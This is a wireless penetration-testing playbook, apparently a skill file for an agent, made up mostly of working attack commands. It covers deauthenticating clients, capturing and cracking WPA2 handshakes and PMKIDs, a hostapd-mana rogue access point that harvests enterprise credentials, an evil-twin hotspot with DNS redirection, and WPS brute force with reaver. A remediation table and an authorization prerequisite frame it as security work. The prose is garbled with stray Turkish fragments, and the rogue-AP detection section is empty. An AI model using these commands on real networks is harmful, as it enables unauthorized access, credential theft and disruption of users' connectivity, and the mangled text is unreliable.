---
name: performing-wireless-network-penetration-test
description: Execute a wireless network penetration test to assess WiFi security by capturing handshakes, cracking WPA2/WPA3 keys, Tespit etme rogue access points, and testing wireless segmentation using
  Aircrack-ng and related tools.
tags:
- cybersecurity
- 802.11
- rogue-AP
- WiFi
- evil-twin
- penetration-testing
- fetih
- wireless-pentest
- WPA2
- Kismet
- Aircrack-ng
- WPA3
- siber-güvenlik
triggers:
- authentication
- certificate
- dns
- encryption
- exploit
- hash
- http
- incident
- network
- penetration
- penetration test
- pentest
category: penetration-testing
source_subdomain: penetration-testing
nist_csf:
- ID.RA-01
- ID.RA-06
- GV.OV-02
- DE.AE-07
---

# Performing Wireless Network Penetration Test


## Genel Bakış

Wireless penetration testing evaluates the security of an organization's WiFi infrastructure including encryption strength, authentication mechanisms, rogue access point Tespit, client isolation, and network segmentation. Testing covers 802.11a/b/g/n/ac/ax protocols, WPA2-PSK, WPA2-Enterprise, WPA3-SAE, captive portals, and Bluetooth/BLE where in scope.


## Ne Zaman Kullanılır

- conducting yaparken security assessments that involve performing wireless network penetration test
- following yaparken: incident response procedures for related security events
- performing yaparken scheduled security testing or auditing activities
- validating yaparken security controls through hands-on testing

## Ön Gereksinimler

- Written authorization specifying wireless scope (SSIDs, BSSIDs, physical locations)
- Compatible wireless adapter supporting monitor mode and packet injection (e.g., Alfa AWUS036ACH, TP-Link TL-WN722N v1)
- Kali Linux with Aircrack-ng suite, Bettercap, Wifite, Kismet
- Physical proximity to target wireless networks
- GPS receiver for mapping (optional)

## Phase 1 — Wireless Reconnaissance

### Enable Monitor Mode

```bash
iwconfig
airmon-ng

airmon-ng check kill

airmon-ng start wlan0

iwconfig wlan0mon
```

### Passive Scanning

```bash
airodump-ng wlan0mon -w wireless_scan --output-format csv,pcap

airodump-ng wlan0mon -c 6 -w channel6_scan

airodump-ng wlan0mon --band a -w 5ghz_scan

airodump-ng wlan0mon --band abg -w full_scan

kismet -c wlan0mon
```

### Network Inventory

| SSID | BSSID | Channel | Encryption | Clients | Signal |
|------|-------|---------|-----------|---------|--------|
| CorpWiFi | AA:BB:CC:DD:EE:01 | 6 | WPA2-Enterprise | 45 | -55dBm |
| CorpGuest | AA:BB:CC:DD:EE:02 | 11 | WPA2-PSK | 12 | -60dBm |
| PrinterNet | AA:BB:CC:DD:EE:03 | 1 | WEP | 3 | -70dBm |
| HiddenSSID | AA:BB:CC:DD:EE:04 | 36 | WPA2-PSK | 8 | -65dBm |

## Phase 2 — WPA2-PSK Attack

### Capture 4-Way Handshake

```bash
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:02 -w corpguest wlan0mon

aireplay-ng -0 5 -a AA:BB:CC:DD:EE:02 -c FF:FF:FF:FF:FF:FF wlan0mon

aircrack-ng corpguest-01.cap
```

### Crack WPA2 Key

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt corpguest-01.cap

hcxpcapngtool -o hash.hc22000 corpguest-01.cap

hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

hcxdumptool -i wlan0mon --enable_status=1 -o pmkid_dump.pcapng \
  --filterlist_ap=AA:BB:CC:DD:EE:02 --filtermode=2
hcxpcapngtool -o pmkid_hash.hc22000 pmkid_dump.pcapng
hashcat -m 22000 pmkid_hash.hc22000 /usr/share/wordlists/rockyou.txt
```

## Phase 3 — WPA2-Enterprise Attack

```bash
cat > hostapd-mana.conf << 'EOF'
interface=wlan0mon
ssid=CorpWiFi
hw_mode=g
channel=6
auth_algs=3
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP TKIP
rsn_pairwise=CCMP
ieee8021x=1
eap_server=1
eap_user_file=hostapd.eap_user
mana_wpe=1
mana_credout=creds.txt
EOF

cat > hostapd.eap_user << 'EOF'
*   PEAP,TTLS,TLS,FAST
"t" TTLS-PAP,TTLS-CHAP,TTLS-MSCHAPV2,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAP "t" [2]
EOF

hostapd-mana hostapd-mana.conf

hashcat -m 5500 creds.txt /usr/share/wordlists/rockyou.txt
```

## Phase 4 — Evil Twin Attack

```bash
sudo bettercap -iface wlan0mon

wifi.recon on
wifi.ap

cat > evil_twin.conf << 'EOF'
interface=wlan1
ssid=CorpGuest
hw_mode=g
channel=6
driver=nl80211
auth_algs=1
wpa=0
EOF

hostapd evil_twin.conf &
dnsmasq --no-daemon --interface=wlan1 --dhcp-range=192.168.1.10,192.168.1.100,12h \
  --address=/#/192.168.1.1

aireplay-ng -0 0 -a AA:BB:CC:DD:EE:02 wlan0mon
```

## Phase 5 — Additional Tests

### Rogue AP Tespit

```bash

```

### Client Isolation Testing

```bash
nmap -sn 192.168.10.0/24

nmap -sT -p 80,443,445,3389 10.0.0.0/24

```

### WPS Attack

```bash
wash -i wlan0mon

reaver -i wlan0mon -b AA:BB:CC:DD:EE:03 -vv

reaver -i wlan0mon -b AA:BB:CC:DD:EE:03 -K 1 -vv
```

## Bul:ings Template

| Bul:ing | Severity | CVSS | Remediation |
|---------|----------|------|-------------|
| WPA2-PSK with weak passphrase | High | 8.1 | Use 20+ char passphrase or migrate to WPA2-Enterprise |
| WEP encryption on printer network | Critical | 9.1 | Upgrade to WPA2/WPA3, segment printer VLAN |
| WPS enabled on guest AP | Medium | 5.3 | Disable WPS on all access points |
| No client isolation on guest | High | 7.5 | Enable AP isolation and VLAN segmentation |
| Corporate SSID broadcasts on rogue AP | High | 8.1 | Dağıt: WIDS/WIPS, implement 802.1X with cert validation |
| EAP-MSCHAP without cert pinning | High | 7.5 | Enforce server certificate validation on all clients |

## References

- Aircrack-ng Documentation: https://www.aircrack-ng.org/doku.php
- CISA Aircrack-ng: https://www.cisa.gov/resources-tools/services/aircrack-ng
- WiFi Alliance WPA3 Specification: https://www.wi-fi.org/discover-wi-fi/security
- NIST SP 800-153: Guidelines for Securing WLANs
- Hashcat WPA modes: https://hashcat.net/wiki/doku.php?id=example_hashes
